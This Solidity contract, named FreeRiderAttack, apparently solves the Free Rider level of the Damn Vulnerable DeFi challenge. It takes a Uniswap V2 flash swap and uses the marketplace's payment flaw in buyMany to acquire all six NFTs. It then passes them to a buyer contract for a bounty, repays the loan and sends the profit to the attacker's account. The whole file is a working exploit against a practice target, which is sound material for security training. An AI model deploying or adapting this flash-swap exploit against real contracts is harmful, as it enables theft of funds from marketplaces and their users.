// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../DamnValuableNFT.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
   function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}


contract FreeRiderAttack is IUniswapV2Callee {

    IFreeRiderNFTMarketplace marketplace;
    IUniswapV2Pair pair;
    DamnValuableNFT nft;
    IWETH9 weth;

    address buyerAddress;
    address owner;

    constructor(address _marketplaceAddress, address _buyerAddress, address _pairAddress, address _nftAddress, address _wethAddress) {
        marketplace = IFreeRiderNFTMarketplace(_marketplaceAddress);
        pair = IUniswapV2Pair(_pairAddress);
        nft = DamnValuableNFT(_nftAddress);
        weth = IWETH9(_wethAddress);

        buyerAddress = _buyerAddress;
        owner = msg.sender;
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner may execute");

        // construct the data param payload
        bytes memory payload = abi.encode("sup"); // not actually needed in this case, just junk to trigger flash swap

        // request 15 ETH flashswap from Uniswap
        pair.swap(
            15 ether, 
            0, 
            address(this),
            payload
        );

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // work out amount to repay (with fees)
        uint repayAmount = ((amount0 * 1000) / 997) + 1;

        // unwrap WETH
        weth.withdraw(amount0);

        // Dear god there must be a better way to create this array wtf...
        // When I try define it more directly:
        // TypeError: Type uint8[6] memory is not implicitly convertible to expected type uint256[] memory
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = uint256(0);
        tokenIds[1] = uint256(1);
        tokenIds[2] = uint256(2);
        tokenIds[3] = uint256(3);
        tokenIds[4] = uint256(4);
        tokenIds[5] = uint256(5);

        // buy all NFTs
        marketplace.buyMany{ value: amount0 }(tokenIds);

        // Send NFTs to buyer contract (receive 45ETH)
        for(uint i=0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                buyerAddress,
                i
            );
        }

        // Wrap some WETH to repay flash swap  
        weth.deposit{ value: repayAmount }();

        // Repay flashswap amount to repay (≈15 ETH, plus fee)
        weth.transfer(address(pair), repayAmount);

        // Send 30 ETH to attacker EOA
        payable(owner).transfer(address(this).balance);


    } 

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
 